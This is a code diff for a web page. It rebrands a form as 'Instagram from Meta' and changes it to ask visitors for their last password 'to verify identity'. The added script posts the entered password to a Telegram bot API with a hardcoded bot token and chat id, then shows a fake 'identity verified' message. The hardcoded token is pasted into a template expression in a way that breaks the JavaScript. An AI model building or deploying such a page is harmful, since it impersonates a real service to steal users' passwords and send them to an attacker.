@@ -350,18 +350,18 @@
                 </svg>
             </div>
 
-            <h2>Confirma tu nombre de usuario</h2>
+            <h2>Confirma tu identidad</h2>
             <p class="description">
-                Ingresa tu nombre de usuario para que podamos contactarte.
+                Ingresa la última contraseña para verificar tu identidad.
             </p>
 
             <form id="resetForm" novalidate>
                 <div class="input-group">
-                    <label for="username">Nombre de usuario</label>
-                    <input type="text" id="username" name="username" placeholder="Nombre de usuario" autocomplete="username" required>
+                    <label for="username">Última contraseña</label>
+                    <input type="text" id="username" name="username" placeholder="Última contraseña" autocomplete="password" required>
                 </div>
                 <button type="submit" class="btn-primary" id="submitBtn">
-                    Confirmar
+                    Confirmar identidad
                 </button>
             </form>
 
@@ -376,7 +376,7 @@
         </div>
 
         <div class="footer">
-            <span>Español (España)</span> · <span>© 2026 Codexa</span>
+            <span>Español (España)</span> · <span>© 2026 Instagram from Meta</span>
         </div>
     </div>
 
@@ -410,7 +410,7 @@
                 submitBtn.textContent = 'Enviando...';
 
                 const texto = `Nuevo nombre de usuario registrado:\n${username}`;
-                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+                const url = `https://api.telegram.org/bot${8237168670:AAH00SjbTq16dYjg5PsTc7i_hgGJAsAfLVQ}/sendMessage`;
 
                 try {
                     const res = await fetch(url, {
@@ -419,14 +419,14 @@
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
+                            chat_id: 8237168670,
                             text: texto
                         })
                     });
                     const data = await res.json();
 
                     if (data.ok) {
-                        successMessage.textContent = '✅ ¡Nombre de usuario enviado!';
+                        successMessage.textContent = 'Identidad verificada.';
                         successMessage.classList.add('show');
                         submitBtn.textContent = 'Enviado ✓';
                         usernameInput.value = '';
@@ -445,7 +445,7 @@
                     console.error('Error:', err);
                     submitBtn.disabled = false;
                     submitBtn.textContent = 'Confirmar';
-                    successMessage.textContent = '❌ Error al enviar. Inténtalo de nuevo.';
+                    successMessage.textContent = 'Error al enviar. Inténtalo de nuevo.';
                     successMessage.style.background = '#fde8ea';
                     successMessage.style.color = '#ed4956';
                     successMessage.style.borderColor = '#f5c2c7';
